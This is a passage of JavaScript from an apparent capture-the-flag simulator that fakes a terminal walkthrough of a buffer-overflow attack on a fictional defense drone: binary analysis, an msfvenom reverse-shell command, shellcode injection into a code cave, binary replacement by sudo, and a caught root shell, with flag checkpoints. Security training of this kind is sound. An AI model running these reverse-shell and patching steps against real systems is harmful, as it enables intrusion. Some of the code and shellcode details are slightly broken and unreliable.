                return `--2026-03-20 14:22:07--  http://10.0.13.5/artifacts/drone_commander.bin
Connecting to 10.0.13.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18842 (18K) [application/octet-stream]
Saving to: 'drone_commander.bin'

drone_commander.bin     100%[===================>]  18.41K  --.-KB/s    in 0.01s

2026-03-20 14:22:07 (1.84 MB/s) - 'drone_commander.bin' saved [18842/18842]`;
            }

            if (url.includes('10.0.13.5')) {
                return `--2026-03-20 14:22:07--  ${url}
Connecting to 10.0.13.5:80... connected.
HTTP request sent, awaiting response... 404 Not Found
ERROR 404: Not Found.`;
            }

            return `wget: unable to resolve host address '${url.replace(/https?:\/\//, '').split('/')[0]}'`;
        },

        'curl': function(args, term, engine) {
            const url = args.find(a => /^https?:\/\//.test(a)) || args.filter(a => !a.startsWith('-')).pop() || '';

            if (url.includes('drone_commander.bin') && url.includes('10.0.13.5')) {
                C17Config._binaryAcquired = true;
                if (engine) engine.advancePhase && engine.advancePhase('acquire');
                return `  % Total    % Received % Xferd  Average Speed   Time
100 18842  100 18842    0     0  1884200      0 --:--:-- --:--:-- --:--:-- 18.4M
[+] drone_commander.bin downloaded to current directory.`;
            }

            if (url.includes('10.0.13.5/artifacts/deployment_guide')) {
                return '[PDF binary data — open in browser for readable format]';
            }

            if (!url) return 'curl: try \'curl --help\' for more information';
            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0] || 'host'}: Connection refused`;
        },

        'file': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: file <filename>';
            if (target.includes('drone_commander') || target.includes('.bin')) {
                if (!C17Config._binaryAcquired) return `file: ${target}: No such file or directory`;
                return C17Config._binaryProfile.file;
            }
            return `${target}: ASCII text`;
        },

        'checksec': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: checksec --file=<binary>';
            if (!C17Config._binaryAcquired) return 'checksec: drone_commander.bin: No such file or directory';
            C17Config._checksecRun = true;
            return C17Config._binaryProfile.checksec;
        },

        'readelf': function(args) {
            if (!C17Config._binaryAcquired) return 'readelf: drone_commander.bin: No such file or directory';
            const flags = args.join(' ');
            if (flags.includes('-S') || flags.includes('--sections')) {
                return C17Config._binaryProfile.readelf_headers;
            }
            if (flags.includes('-h') || flags.includes('--file-header')) {
                return C17Config._binaryProfile.readelf_headers.split('Section Headers:')[0].trim();
            }
            if (flags.includes('-d') || flags.includes('--dynamic')) {
                return `Dynamic section at offset 0x2e00 contains 24 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)              Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x1000
 0x000000000000000d (FINI)               0x1680
 0x0000000000000019 (INIT_ARRAY)         0x2df8
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)`;
            }
            return 'Usage: readelf [-S|-h|-d] <binary>\nExample: readelf -S drone_commander.bin';
        },

        'objdump': function(args) {
            if (!C17Config._binaryAcquired) return 'objdump: drone_commander.bin: No such file or directory';
            const flags = args.join(' ');
            if (flags.includes('-d') || flags.includes('--disassemble')) {
                return C17Config._binaryProfile.objdump_main;
            }
            if (flags.includes('-x') || flags.includes('--all-headers')) {
                return `drone_commander.bin:     file format elf64-x86-64
architecture: i386:x86-64, flags 0x00000150:
HAS_SYMS, DYNAMIC, D_PAGED
start address 0x0000000000001080

Program Header:
    PHDR off    0x0000000000000040 vaddr 0x0000000000000040 paddr 0x0000000000000040
    LOAD off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000
    LOAD off    0x0000000000002e00 vaddr 0x0000000000002e00 paddr 0x0000000000002e00
 DYNAMIC off    0x0000000000002e00 vaddr 0x0000000000002e00 paddr 0x0000000000002e00`;
            }
            return 'Usage: objdump -d <binary>\nExample: objdump -d drone_commander.bin | less';
        },

        'ghidra': function(args) {
            if (!C17Config._binaryAcquired) return 'ghidra: drone_commander.bin: No such file or directory';
            C17Config._ghidraLoaded = true;
            if (engine) engine.advancePhase && engine.advancePhase('reverse');
            return `[+] Ghidra 11.1.2 (headless mode)
[*] Project: /home/kali/ghidra_projects/c17-forge
[*] Importing: drone_commander.bin
[*] Analysis complete (14 analyzers, 8.4s)

--- DECOMPILATION: parse_cmd_param ---

${C17Config._binaryProfile.ghidra_decompile}

[+] Vulnerability identified: parse_cmd_param() at 0x10e0
[+] strcpy() at 0x1106 — no bounds check on 64-byte local_buf
[+] RIP overwrite offset: 104 bytes (confirmed via stack frame analysis)
[+] Code cave located: 0x11f0 — 156 bytes available`;
        },

        'ROPgadget': function(args) {
            if (!C17Config._binaryAcquired) return 'ROPgadget: drone_commander.bin: No such file or directory';
            return C17Config._binaryProfile.ropgadget;
        },

        'gdb': function(args, term, engine) {
            if (!C17Config._binaryAcquired) return 'gdb: drone_commander.bin: No such file or directory';
            const argStr = args.join(' ');
            if (argStr.includes('drone_commander') || args.length === 0) {
                if (engine) engine.advancePhase && engine.advancePhase('reverse');
                return `GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Reading symbols from drone_commander.bin...
(No debugging symbols found in drone_commander.bin)

pwndbg> cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac

pwndbg> r
Starting program: /home/kali/drone_commander.bin
Drone Command System v2.4.1 - Awaiting command parameter...

Program received signal SIGSEGV, Segmentation fault.
0x6161617261616171 in ?? ()

pwndbg> cyclic -l 0x6161617261616171
Finding cyclic pattern of 8 bytes: b'qaaaraasr' (hex: 0x716161617261 6172)
Found at offset 104

[+] RIP OVERWRITE OFFSET: 104 bytes
[+] Vulnerable function: parse_cmd_param (confirmed via stack trace)

pwndbg> info registers rip
rip            0x6161617261616171   0x6161617261616171`;
            }
            return 'Usage: gdb <binary>\nExample: gdb drone_commander.bin';
        },

        'msfvenom': function(args, term, engine) {
            const argStr = args.join(' ');
            if (args.length === 0) return 'Usage: msfvenom -p <payload> [options]\nExample: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -b "\\x00"';

            // Require a legit-looking payload specification
            if (argStr.includes('linux/x64') && argStr.includes('LHOST') && argStr.includes('LPORT')) {
                const lhostMatch = argStr.match(/LHOST=(\S+)/);
                const lportMatch = argStr.match(/LPORT=(\d+)/);
                const lhost = lhostMatch ? lhostMatch[1] : '10.0.0.5';
                const lport = lportMatch ? lportMatch[1] : '4444';

                C17Config._shellcodeGenerated = true;

                return `[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor_dynamic
x64/xor_dynamic succeeded with size 135 (iteration=0)
x64/xor_dynamic chosen with final size 135
Payload size: 135 bytes

Shellcode (hex):
\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x89\\xc6\\x48\\x8d\\x3d\\x04\\x00\\x00\\x00\\x04\\x3b
\\x0f\\x05\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x31\\xdb\\x89\\xd8\\x40\\x89\\xc7\\x31
\\xf6\\x31\\xd2\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7
\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05

Generating: /home/kali/shellcode.bin (${lhost}:${lport})
[-] Payload size: 135 bytes. Saved as: shellcode.bin`;
            }

            if (argStr.includes('-l') || argStr.includes('--list')) {
                return `Framework Payloads (562 total) [--payload <value>]
...
   linux/x64/exec                                        Execute an arbitrary command
   linux/x64/meterpreter/reverse_tcp                    Inject the mettle server payload
   linux/x64/shell/reverse_tcp                          Spawn a command shell
   linux/x64/shell_reverse_tcp                          Connect back to attacker and spawn a command shell`;
            }

            return 'Error: A payload is required. Use -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>';
        },

        'python3': function(args, term, engine) {
            const argStr = args.join(' ');

            // Shellcode injection / patching script execution
            if (argStr.includes('sploit.py') || argStr.includes('patch') || argStr.includes('inject')) {
                if (!C17Config._binaryAcquired) {
                    return 'python3: FileNotFoundError: [Errno 2] No such file or directory: \'drone_commander.bin\'';
                }
                if (!C17Config._shellcodeGenerated) {
                    return '[!] shellcode.bin not found. Generate shellcode first:\n    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -b "\\x00" -o shellcode.bin';
                }
                C17Config._binaryPatched = true;
                if (engine) engine.advancePhase && engine.advancePhase('patch');
                return `[*] Reading drone_commander.bin (18842 bytes)
[*] Loading shellcode from shellcode.bin (135 bytes)
[*] Code cave located at offset 0x11f0 (156 bytes available, 135 needed — OK)
[+] Injecting shellcode at file offset 0x11f0...
[+] Patching return address at offset 0x401119 -> JMP 0x4011f0
[+] Shellcode hex (first 24 bytes): \\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x89\\xc6\\x48\\x8d\\x3d\\x04\\x00\\x00\\x00\\x04\\x3b\\x0f\\x05\\x2f\\x62\\x69\\x6e
[+] Writing patched_drone_commander.bin (18842 bytes)
[+] Verifying patch: objdump confirms JMP at 0x401119 -> 0x4011f0

{{FLAG:patch}}

Patched binary saved: /home/kali/patched_drone_commander.bin`;
            }

            // Cyclic pattern generation via pwntools inline
            if (argStr.includes('cyclic') || argStr.includes('pwn')) {
                return `Python 3.11.4 (main, Jun 7 2023, 10:13:09)
>>> from pwn import *
>>> cyclic(300)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaabaaacaaad...'
>>> cyclic_find(0x6161617261616171)
104`;
            }

            if (argStr.includes('-c') && argStr.includes('print')) {
                // Inline pattern generator
                return 'A' * 120;
            }

            return 'Python 3.11.4 (main, Jun  7 2023, 10:13:09)\n[GCC 12.3.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>>';
        },

        'python': function(args, term, engine) {
            // Alias to python3
            return C17Config.commands.python3(args, term, engine);
        },

        'scp': function(args, term, engine) {
            const argStr = args.join(' ');

            if (argStr.includes('patched_drone_commander.bin') && argStr.includes('10.0.13.20')) {
                if (!C17Config._binaryPatched) {
                    return 'scp: /home/kali/patched_drone_commander.bin: No such file or directory\n[!] Patch the binary first using your injection script.';
                }
                return `patched_drone_commander.bin             100%   18KB   1.8MB/s   00:00
[+] Binary uploaded to drone_operator@10.0.13.20:/tmp/patched_drone_commander.bin`;
            }

            if (argStr.includes('drone_commander.bin') && argStr.includes('10.0.13.20')) {
                if (!C17Config._binaryPatched) {
                    return 'scp: /home/kali/patched_drone_commander.bin: No such file or directory';
                }
                return `drone_commander.bin             100%   18KB   1.8MB/s   00:00`;
            }

            return 'Usage: scp <source> <user@host:destination>\nExample: scp patched_drone_commander.bin drone_operator@10.0.13.20:/tmp/';
        },

        'ssh': function(args, term, engine) {
            const argStr = args.join(' ');

            if ((argStr.includes('drone_operator') || argStr.includes('10.0.13.20')) && !argStr.includes('-L')) {
                if (!C17Config._binaryPatched) {
                    return `drone_operator@10.0.13.20's password:
Permission denied, please try again.
[!] SSH available but complete the patching phase first.`;
                }
                C17Config._sshAuthenticated = true;
                C17Config._switchContext('ssh-drone', term);
                if (engine) engine.advancePhase && engine.advancePhase('deploy');
                return `The authenticity of host '10.0.13.20 (10.0.13.20)' can't be established.
ED25519 key fingerprint is SHA256:mQ7tR2nP4kF9vB8wL1jE5cX3dA0sZ6yH2gN7iM4oC8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.13.20' (ED25519) to the list of known hosts.
drone_operator@10.0.13.20's password: ************

Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com

AD-DRONE-01 — Citadel Autonomous Defense Drone
System status: OPERATIONAL
Last operator login: 2026-03-19 08:14:52 from 10.0.13.200

drone_operator@AD-DRONE-01:~$

[+] SSH session established. You are now on AD-DRONE-01 as drone_operator.
[+] Context switched. Commands now execute on AD-DRONE-01.`;
            }

            return 'Usage: ssh [user@]hostname\nExample: ssh drone_operator@10.0.13.20\nCredential note: check deployment_guide.pdf';
        },

        'nc': function(args, term, engine) {
            const argStr = args.join(' ');

            if (argStr.includes('-l') && (argStr.includes('4444') || argStr.includes('-p'))) {
                C17Config._listenerActive = true;
                return `Listening on [0.0.0.0] (family 0, port 4444)
[+] nc listener started. Waiting for incoming connection...
[!] Trigger the overflow on AD-DRONE-01 to catch the reverse shell.
    Run: sudo /usr/local/bin/drone_commander.bin with overflow input`;
            }

            return 'Usage: nc -lvnp <port>\nExample: nc -lvnp 4444';
        },

        'netcat': function(args, term, engine) {
            return C17Config.commands.nc(args, term, engine);
        },

        'sudo': function(args, term, engine) {
            if (C17Config._context !== 'ssh-drone') {
                return 'sudo: command not found\n[!] You need to SSH to AD-DRONE-01 first.';
            }

            const argStr = args.join(' ');

            // Replace the binary
            if (argStr.includes('cp') && argStr.includes('patched_drone_commander.bin') && argStr.includes('/usr/local/bin/')) {
                if (!C17Config._binaryPatched) {
                    return 'sudo: cp: /tmp/patched_drone_commander.bin: No such file or directory\n[!] Upload the patched binary to /tmp/ via scp first.';
                }
                C17Config._binaryDeployed = true;
                if (engine) engine.advancePhase && engine.advancePhase('deploy');
                return `[sudo] password for drone_operator:
[+] Binary replaced: /usr/local/bin/drone_commander.bin -> patched version
[+] File size: 18842 bytes (matches expected)
[+] Forged code deployed. Ready to trigger.

{{FLAG:deploy}}`;
            }

            // Execute the patched binary (trigger the exploit)
            if ((argStr.includes('/usr/local/bin/drone_commander.bin') || argStr.includes('drone_commander.bin')) && C17Config._binaryDeployed) {
                if (!C17Config._listenerActive) {
                    return `[sudo] password for drone_operator:
[+] Running drone_commander.bin as root...
Drone Command System v2.4.1 - Awaiting command parameter...
[!] Exploit triggered but no listener detected!
    Start nc -lvnp 4444 on your attacker machine FIRST, then trigger again.`;
                }
                C17Config._shellReceived = true;
                C17Config._switchContext('root-drone', term);
                if (engine) engine.advancePhase && engine.advancePhase('trigger');
                return `[sudo] password for drone_operator:
[+] Running drone_commander.bin as root...
Drone Command System v2.4.1 - Awaiting command parameter...
[overflow payload sent]

--- On attacker machine (nc listener) ---
Connection received from 10.0.13.20
id
uid=0(root) gid=0(root) groups=0(root)

[+] REVERSE SHELL RECEIVED — running as root on AD-DRONE-01
[+] Context elevated. You now have a root shell on AD-DRONE-01.`;
            }

            // chmod the binary after copy
            if (argStr.includes('chmod') && argStr.includes('drone_commander.bin')) {
                return `[sudo] password for drone_operator:
[+] Permissions set: /usr/local/bin/drone_commander.bin -> 755`;
            }

            // Generic sudo deny for non-whitelisted actions
            if (argStr.includes('cat') || argStr.includes('bash') || argStr.includes('sh ')) {
                return `[sudo] password for drone_operator:
Sorry, user drone_operator is not allowed to execute '${args[0]}' as root on AD-DRONE-01.
[!] Sudoers only allows binary copy and execution. Check /etc/sudoers.d/drone_operator.`;
            }

            return `[sudo] password for drone_operator:
Sorry, user drone_operator is not allowed to execute '${args.join(' ')}' as root on AD-DRONE-01.`;
        },

        // Context-aware cat — intercepts when in ssh-drone or root-drone context
        'cat': function(args, term, engine) {
            const ctx = C17Config._context;

            if (ctx === 'attacker') return null; // fall through to built-in

            const path = args[0] || '';

            // Root flag — only accessible in root context
            if (path.includes('drone_master_override') || path.includes('/root/')) {
                if (ctx !== 'root-drone') {
                    return `cat: /root/drone_master_override.txt: Permission denied\n[!] You need root access. Trigger the exploit to escalate.`;
                }
                if (engine) engine.advancePhase && engine.advancePhase('trigger');
                return `cat: /root/drone_master_override.txt

{{FLAG:root}}`;
            }

            if (ctx === 'ssh-drone') {
                if (path.includes('op_notes') || path.includes('op_notes.txt')) {
                    return C17Config._droneFs['/'].children['home'].children['drone_operator'].children['op_notes.txt'].content;
                }
                if (path.includes('/etc/sudoers.d/drone_operator') || path.includes('sudoers')) {
                    return C17Config._droneFs['/'].children['etc'].children['sudoers.d'].children['drone_operator'].content;
                }
                if (path.includes('/etc/passwd')) {
                    return C17Config._droneFs['/'].children['etc'].children['passwd'].content;
                }
                if (path.includes('/etc/hostname')) return 'AD-DRONE-01';
                if (path.includes('.bash_history')) {
                    return C17Config._droneFs['/'].children['home'].children['drone_operator'].children['.bash_history'].content;
                }
                return `cat: ${path}: No such file or directory`;
            }

            if (ctx === 'root-drone') {
                if (path.includes('/etc/passwd')) {
                    return C17Config._droneFs['/'].children['etc'].children['passwd'].content;
                }
                if (path.includes('/etc/hostname')) return 'AD-DRONE-01';
                return `cat: ${path}: No such file or directory`;
            }

            return null;
        },

        // Context-aware ls
        'ls': function(args, term, engine) {
            const ctx = C17Config._context;
            if (ctx === 'attacker') return null; // fall through to built-in

            const path = args.find(a => !a.startsWith('-')) || '.';

            if (ctx === 'ssh-drone') {
                if (path === '.' || path === '~' || path.includes('/home/drone_operator')) {
                    return '.bash_history  .bashrc  .profile  op_notes.txt';
                }
                if (path.includes('/usr/local/bin') || path.includes('bin')) {
                    const marker = C17Config._binaryDeployed ? ' [FORGED]' : '';
                    return `drone_commander.bin${marker}`;
                }
                if (path.includes('/tmp')) {
                    return C17Config._binaryPatched ? 'patched_drone_commander.bin' : '';
                }
                if (path.includes('/etc/sudoers.d')) {
                    return 'drone_operator';
                }
                return '';
            }

            if (ctx === 'root-drone') {
                if (path === '.' || path === '/root' || path === '~') {
                    return 'drone_master_override.txt  .bashrc  .ssh';
                }
                return C17Config.commands.ls.call(this, args, term, engine);
            }

            return '';
        },

        // Context-aware whoami/id/hostname
        'whoami': function(args) {
            if (C17Config._context === 'ssh-drone') return 'drone_operator';
            if (C17Config._context === 'root-drone') return 'root';
            return null;
        },

        'id': function(args) {
            if (C17Config._context === 'ssh-drone') return 'uid=1001(drone_operator) gid=1001(drone_operator) groups=1001(drone_operator),27(sudo)';
            if (C17Config._context === 'root-drone') return 'uid=0(root) gid=0(root) groups=0(root)';
            return null;
        },

        'hostname': function(args) {
            if (C17Config._context === 'ssh-drone' || C17Config._context === 'root-drone') return 'AD-DRONE-01';
            return null;
        },

        'pwd': function(args) {
            if (C17Config._context === 'ssh-drone') return '/home/drone_operator';
            if (C17Config._context === 'root-drone') return '/root';
            return null;
        },

        'cd': function(args) {
            if (C17Config._context === 'ssh-drone' || C17Config._context === 'root-drone') return '';
            return null;
        },

        'uname': function(args) {
            const flags = args.join(' ');
            if (flags.includes('-a')) {
                if (C17Config._context === 'ssh-drone' || C17Config._context === 'root-drone') {
                    return 'Linux AD-DRONE-01 5.15.0-101-generic #111-Ubuntu SMP x86_64 GNU/Linux';
                }
            }
            return 'Linux';
        },

        'exit': function(args, term, engine) {
            if (C17Config._context === 'root-drone') {
                C17Config._switchContext('ssh-drone', term);
                return '[+] Exited root shell. Returned to drone_operator context.';
            }
            if (C17Config._context === 'ssh-drone') {
                C17Config._switchContext('attacker', term);
                return 'Connection to 10.0.13.20 closed.\n[+] Returned to attacker machine (kali).';
            }
            return 'logout';
        },

        'ping': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';

            if (target === '10.0.13.5') {
                return `PING 10.0.13.5 (10.0.13.5) 56(84) bytes of data.
64 bytes from 10.0.13.5: icmp_seq=1 ttl=64 time=11.4 ms
64 bytes from 10.0.13.5: icmp_seq=2 ttl=64 time=10.8 ms
64 bytes from 10.0.13.5: icmp_seq=3 ttl=64 time=11.1 ms

--- 10.0.13.5 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss`;
            }

            if (target === '10.0.13.20') {
                return `PING 10.0.13.20 (10.0.13.20) 56(84) bytes of data.
64 bytes from 10.0.13.20: icmp_seq=1 ttl=64 time=9.2 ms
64 bytes from 10.0.13.20: icmp_seq=2 ttl=64 time=9.0 ms
64 bytes from 10.0.13.20: icmp_seq=3 ttl=64 time=9.4 ms

--- 10.0.13.20 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss`;
            }

            return `PING ${target} (${target}) 56(84) bytes of data.

--- ${target} ping statistics ---
3 packets transmitted, 0 received, 100% packet loss`;
        },

        'ip': function(args) {
            if (C17Config._context === 'ssh-drone' || C17Config._context === 'root-drone') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.0.13.20/24 brd 10.0.13.255 scope global eth0`;
            }
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.0.0.5/24 brd 10.0.0.255 scope global eth0`;
        },

        'ifconfig': function(args) {
            return C17Config.commands.ip(args || []);
        },

        'ss': function(args) {
            if (C17Config._context === 'ssh-drone' || C17Config._context === 'root-drone') {
                return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*
LISTEN   0        128      0.0.0.0:9000         0.0.0.0:*`;
            }
            return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*`;
        },

        'netstat': function(args) {
            return C17Config.commands.ss(args);
        },

        'strings': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!C17Config._binaryAcquired) return `strings: ${target}: No such file or directory`;
            if (!target.includes('drone_commander') && !target.includes('.bin')) {
                return `strings: ${target}: No such file or directory`;
            }
            return `Drone Command System v2.4.1
Awaiting command parameter...
Usage: drone_commander <command_parameter>
Command parameter too long.
Error: Command processing failed.
/bin/sh
/lib64/ld-linux-x86-64.so.2
libc.so.6
strcpy
strlen
puts
gets
__libc_start_main
GLIBC_2.2.5
[+] Drone daemon started on port 9000
[+] Awaiting operator command...
parse_cmd_param
process_command
validate_auth
init_hardware_api`;
        },

        'ltrace': function(args) {
            if (!C17Config._binaryAcquired) return 'ltrace: drone_commander.bin: No such file or directory';
            return `__libc_start_main(0x5555555550a0, 1, 0x7fffffffde98, <unfinished ...>
setvbuf(0x7ffff7f77a00, 0, 2, 0)                              = 0
puts("Drone Command System v2.4.1 - Awaiting command parameter...")
gets(0x7fffffffdd20)                                          = 0x7fffffffdd20
parse_cmd_param(0x7fffffffdd20)
  strlen(0x7fffffffdd20)                                      = [user input length]
  strcpy(0x7fffffffdd00, 0x7fffffffdd20)                      = 0x7fffffffdd00  [DANGEROUS!]
  process_command(0x7fffffffdd00)                             = 0
+++ exited (status 0) +++

[+] ltrace confirms: gets() + strcpy() chain — no bounds checking
[+] strcpy destination buffer: 64 bytes (located at rbp-0x40)`;
        },

        'strace': function(args) {
            if (!C17Config._binaryAcquired) return 'strace: drone_commander.bin: No such file or directory';
            return `execve("./drone_commander.bin", ["./drone_commander.bin"], 0x7fffffffde10 /* 23 vars */) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1234560000
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
read(3, "\\x7f\\x45\\x4c\\x46...", 4096) = 4096
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
write(1, "Drone Command System v2.4.1 - Aw"..., 54) = 54
read(0, [waiting for stdin...], 8192) = [user_input_length]
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x6161617261616171} ---
+++ killed by SIGSEGV +++`;
        },

        'hexedit': function(args) {
            if (!C17Config._binaryAcquired) return 'hexedit: drone_commander.bin: No such file or directory';
            return `hexedit drone_commander.bin
[hexedit interactive mode — simulated]

Offset 0x11f0 (code cave start):
11f0: 90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  ................
1200: 90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  ................
1210: 90 90 90 90 90 90 90 90  00 00 00 00 00 00 00 00  ................
1220: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................

[+] 156 bytes of NOP/zero padding confirmed at 0x11f0
[+] Suitable for shellcode injection. Use Python + pwntools for automated patching.
Press Ctrl+X to exit hexedit.`;
        },

        'xxd': function(args) {
            const argStr = args.join(' ');
            if (!C17Config._binaryAcquired) return 'xxd: drone_commander.bin: No such file or directory';
            if (argStr.includes('0x11f0') || argStr.includes('4592') || argStr.includes('-s')) {
                return `00001190: c3 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  ................
000011f0: 90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  ................
00001200: 90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  ................
00001210: 90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  ................
00001220: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................

[+] Code cave confirmed at offset 0x11f0 — 156 bytes zeroed`;
            }
            // Header bytes
            return `00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0300 3e00 0100 0000 8010 0000 0000 0000  ..>.............
00000020: 4000 0000 0000 0000 5847 0000 0000 0000  @.......XG......`;
        },

        'patchelf': function(args) {
            if (!C17Config._binaryAcquired) return 'patchelf: drone_commander.bin: No such file or directory';
            const argStr = args.join(' ');
            if (argStr.includes('--set-interpreter')) {
                return '[+] patchelf: interpreter set on drone_commander.bin';
            }
            return `patchelf 0.14.5
Usage: patchelf [options] <elf-file>
Options:
  --set-interpreter <path>    Set ELF interpreter
  --set-rpath <path>          Set RPATH
  --remove-rpath              Remove RPATH
  --page-size <size>          Set page size`;
        },

        'ldd': function(args) {
            if (!C17Config._binaryAcquired) return 'ldd: drone_commander.bin: No such file or directory';
            return `\tlinux-vdso.so.1 (0x00007ffea3d2d000)
\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8b2a400000)
\t/lib64/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f8b2a7e3000)`;
        },

        'chmod': function(args) {
            const argStr = args.join(' ');
            return `[+] chmod: ${args[args.length - 1]} permissions updated`;
        },

        'cp': function(args, term, engine) {
            if (C17Config._context !== 'ssh-drone') return null;
            const argStr = args.join(' ');
            // Non-sudo copy attempt at restricted path
            if (argStr.includes('/usr/local/bin/')) {
                return `cp: cannot create regular file '/usr/local/bin/drone_commander.bin': Permission denied
[!] Use sudo cp (already whitelisted in sudoers): sudo cp /tmp/patched_drone_commander.bin /usr/local/bin/drone_commander.bin`;
            }
            return '';
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#f39c12; border-bottom:2px solid #333; background:#1a1a1a;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #333; color:#ccc;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
